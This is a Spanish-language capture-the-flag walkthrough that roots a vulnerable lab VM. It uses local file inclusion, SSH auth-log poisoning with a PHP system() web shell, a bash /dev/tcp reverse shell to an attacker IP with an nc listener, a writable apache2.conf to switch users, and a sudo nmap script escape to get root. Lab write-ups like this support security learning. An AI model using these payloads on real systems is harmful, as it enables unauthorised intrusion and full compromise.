IP: 
192.168.1.55

MAC: 
00:0c:29:7a:1f:ed


Ports:
22: ssh OpenSSH 7.6p1 Ubuntu
80: http Apache httpd 2.4.29 
-----------------------------------------------------------------
Como no hay mucho que hacer, le pasamos el wfuzz
sudo wfuzz 
sudo wfuzz -c --hc 404 -w ~/Documents/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt http://192.168.1.55/WFUZZ

vemos que aparecen posibles entradas:
console
images
-----------------------------------------------------------------
Al mirar http://192.168.1.55/console/ en el navegador, aparece lo siguiente:

Parent Directory
file.php

Miramos el fichero en el navegador:
> http://192.168.1.55/console/file.php

No aparece nada.
-----------------------------------------------------------------
Miramos posibles formas de manipular php:
> https://ironhackers.es/herramientas/lfi-cheat-sheet/

y justo el ejemplo que pone de php nos sirve para probar lo siguiente:
> http://192.168.1.55/console/file.php?/etc/passwd

y nos da el fichero en cuestion, que guardamos en disco.
-----------------------------------------------------------------
si queremos obtener el propio fichero php, no podemos escribir esto:
> http://192.168.1.55/console/file.php?file=file.php

porque interpretará el propio contenido, pero podemos jugar codificándo la url:
>http://192.168.1.55/console/file.php?file=php://filter/convert.base64-encode/resource=file.php

Y devuelve:
PD9waHAKICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOwogICBpZihpc3NldCgkZmlsZSkpCiAgIHsKICAgICAgIGluY2x1ZGUoIiRmaWxlIik7CiAgIH0KICAgZWxzZQogICB7CiAgICAgICBpbmNsdWRlKCJpbmRleC5waHAiKTsKICAgfQogICA/Pgo=

para decodificarlo podemos hacer:

> echo PD9waHAKICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOwogICBpZihpc3NldCgkZmlsZSkpCiAgIHsKICAgICAgIGluY2x1ZGUoIiRmaWxlIik7CiAgIH0KICAgZWxzZQogICB7CiAgICAgICBpbmNsdWRlKCJpbmRleC5waHAiKTsKICAgfQogICA/Pgo= | base64 -d | batcat -l php

lo que devuelve:
       │ STDIN
───────┼───────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │    $file = $_GET['file'];
   3   │    if(isset($file))
   4   │    {
   5   │        include("$file");
   6   │    }
   7   │    else
   8   │    {
   9   │        include("index.php");
  10   │    }
  11   │    ?>

-----------------------------------------------------------------
podemos intentar hacer log poisoning. miramos el log de apache2
> http://192.168.1.55/console/file.php?/var/log/apache2/access.log

pero no obtenemos nada
Como sabemos que también gestiona ssh, miramos el log de ssh:
> http://192.168.1.55/console/file.php?/var/log/auth.log

y aquí si que obtenemos cosas.
-----------------------------------------------------------------
Así pues vemos que aquí podemos introducir algo a nuestra voluntad al intentar iniciar sesiñon con ssh.

> ssh pepito@192.168.1.55
> pass: xxxxxx 
Error
^C Control+C

> http://192.168.1.55/console/file.php?/var/log/auth.log

Ahora vemos una linea que dice que no el usuario pepito ha intentado entrar sin éxito:
....
Dec 13 14:24:18 ubuntu sshd[753]: Invalid user pepito from 192.168.1.79 port 49396
....
-----------------------------------------------------------------
Por lo tanto si hacemos:
> ssh '<?php system("whoami"); ?>'@192.168.1.55 
> password: xxxxx
Error
^C Control+C

al hacer:
> http://192.168.1.55/console/file.php?/var/log/auth.log

vemos lo siguiente:
....
Dec 13 14:26:20 ubuntu sshd[764]: Invalid user www-data
 from 192.168.1.79 port 60588
....
-----------------------------------------------------------------
Así que podemos introducir comandos a nuestra voluntad. De manera genérica y para no tener que hacer 2 pasos, podemos generar un ejecutor de comandos en la propia url de la siguiente manera:
> ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.55
> password: xxxxx
Error
^C Control+C
 
Así desde la linea donde escribimos la url en el navegador podemos insertar comandos fácilmente:
> http://192.168.1.55/console/file.php?/var/log/auth.log&cmd=COMANDO

Si por ejemplo lo que queremos es abrirnos una reverse shell, esto es lo que deberíamos introducir:

bash -c "/bin/bash -i >& /dev/tcp/192.168.1.79/443 0>&1"
como comando

>http://192.168.1.55/console/file.php?file=/var/log/auth.log&cmd=bash -c "/bin/bash -i >%26 /dev/tcp/192.168.1.79/443 0>%261"


%26 = &
$20 = [espacio]
%22 = "
-----------------------------------------------------------------

Antes de crear la reverse shell, hemos de crear el listener en la máquina atacante:
nc -lvnp 443
-----------------------------------------------------------------
Tras ganar acceso a la máquina, hacemos el tratamiento de la tty, tal como se explica en Tratamiento_consola.txt
-----------------------------------------------------------------
Miramos qué ficheros tiene el flag setuid:

> www-data@ubuntu:/$ find / -perm /4000 2>/dev/null

/usr/bin/chfn
/usr/bin/vmware-user-suid-wrapper
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/bin/ping
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
-----------------------------------------------------------------
Miramos qué ficheros tiene acceso de escritura el usuario actual
> find / -writable 2>/dev/null | grep -vE "proc|bin|lib|dev|run|sys"

/tmp
/etc/apache2/apache2.conf
/var/www/html
/var/tmp
/var/lock
/var/cache/apache2/mod_cache_disk

-----------------------------------------------------------------
Como vemos que el archivo apache2.conf es escribible por el ususario actual, podemos abrir el fichero y cambiar el parámetro user / group por otro

de

user $APACHE_RUN_USER
group $APACHE_RUN_GROUP

a

user mahakal
group mahakal

y reiniciamos el server

No podemos poner como user/group root pq el servidor no se inicia correctamente y hay cosas que antes funcionaban y ahora no.
-----------------------------------------------------------------

Ahora podemos entrar en la máquina como mahakal.
Haciendo sudo -l vemos lo siguiente:
> sudo -l

Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap

-----------------------------------------------------------------
si vamos a https://gtfobins.github.io/gtfobins/nmap/ vamos a mirar qué vulnerabilidades se pueden explotar en nmap

Si puedes spawnearlo con sudo, se crear un shell con privilegios de root:

> TF=$(mktemp)
> echo 'os.execute("/bin/sh")' > $TF
> sudo nmap --script=$TF

-----------------------------------------------------------------
Ahora aparece lo siguiente:

Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-16 13:18 PST
NSE: Warning: Loading '/tmp/tmp.4vmImGppty' -- the recommended file extension is '.nse'.
#

y aqui podemos escribir, lo que pasa es que lo escrito no se ve, pero si haces whoami sale:
> whoami
root

Escribimos aunque no se vea:
>cd /root

Escribimos aunque no se vea:
ls -la
drwx------  3 root root 4096 Jun  3  2020 .
drwxr-xr-x 22 root root 4096 Jun  3  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jun  3  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root 1592 Jun  3  2020 root.txt

-----------------------------------------------------------------

y finalmente escribimos aunque no se vea:
> cat root.txt



███▄▄▄▄      ▄████████     ███        ▄████████    ▄████████      ▄█ 
███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███   ███    ███     ███ 
███   ███   ███    ███    ▀███▀▀██   ███    ███   ███    ███     ███ 
███   ███   ███    ███     ███   ▀  ▄███▄▄▄▄██▀   ███    ███     ███ 
███   ███ ▀███████████     ███     ▀▀███▀▀▀▀▀   ▀███████████     ███ 
███   ███   ███    ███     ███     ▀███████████   ███    ███     ███ 
███   ███   ███    ███     ███       ███    ███   ███    ███     ███ 
 ▀█   █▀    ███    █▀     ▄████▀     ███    ███   ███    █▀  █▄ ▄███ 
                                     ███    ███              ▀▀▀▀▀▀  


!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Geet Madan : https://www.linkedin.com/in/geet-madan/


